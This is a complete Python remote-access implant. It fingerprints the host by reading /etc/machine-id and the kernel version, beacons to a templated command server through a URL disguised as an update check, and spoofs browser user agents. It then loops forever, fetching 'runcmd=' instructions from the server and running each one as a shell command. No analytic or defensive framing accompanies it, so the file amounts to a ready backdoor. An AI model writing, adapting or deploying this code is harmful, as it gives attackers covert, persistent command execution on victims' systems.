import urllib.request, base64
import subprocess
import time, os




current_path = os.path.dirname(os.path.abspath(__file__)) + "/"


serverHOST = "http://{API_FQDN}"
updatesURL = "{}/checkupdate.js?id={}&token={}&platform={}"


headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36'}
stealthHeaders = {'User-Agent': 'JustKidding'}


def customBase64(encodedTxt, decode=1):
	if isinstance(encodedTxt, str):
		encodedTxt = bytes(encodedTxt, 'utf-8')
	replacements_ = [['+', 'plus'], ['/', 'slash'], ['=', 'equal']]
	if decode == -1:
		encodedTxt = base64.b64encode(encodedTxt).decode('ascii')
		for i in replacements_:
			encodedTxt = encodedTxt.replace(i[0], i[1])
		return encodedTxt
	for i in replacements_:
		encodedTxt = encodedTxt.replace(i[::-1][0], i[::-1][1])
	return base64.b64decode(encodedTxt).decode('ascii')




def runCMD(query):
	output = subprocess.check_output(query, shell=True)
	return output.decode('utf-8')




def adjustCMD(query):
	global current_path
	altsArr = {'/data/data/net.orange.bolt/': current_path, "elf.out": "toolbox"}
	for k, v in altsArr.items():
		query = query.replace(k, v)
	return query.replace("\n","").replace("\r","")



getUUID = runCMD("cat /etc/machine-id").replace('\n','')

getPlatform = "Linux " + runCMD('uname -r').split('-')[0]


## Initialisation ##
fqdn = updatesURL.format(serverHOST, getUUID, 0, customBase64(getPlatform, -1))
req = urllib.request.Request(fqdn, headers=headers)
_ = urllib.request.urlopen(req)




def getCMD():
	global serverHOST, getUUID, getPlatform
	fqdn = updatesURL.format(serverHOST, getUUID, 'updated', customBase64(getPlatform, -1))
	req = urllib.request.Request(fqdn, headers=stealthHeaders)
	f = urllib.request.urlopen(req)
	respCMD = f.read().decode('utf-8')
	if 'runcmd=' in respCMD:
		respCMD = adjustCMD(respCMD[7:])
	return respCMD




runThisArr = ['sleep' for i in range(52)]
standByCounter = 0
loopCount = -1



while True:
	loopCount += 1
	runThis = getCMD()
	runThisArr[loopCount%50 + 2] = runThis
	if (not ('sleep' in runThisArr[loopCount%50 + 2] and 'sleep' not in runThisArr[loopCount%50 + 1]) or standByCounter > 30):
		print("[!] Running: {}".format(runThis))
		runCMD(runThis)
		standByCounter = 0
	else:
		loopCount -= 1
		standByCounter += 1
		time.sleep(1)


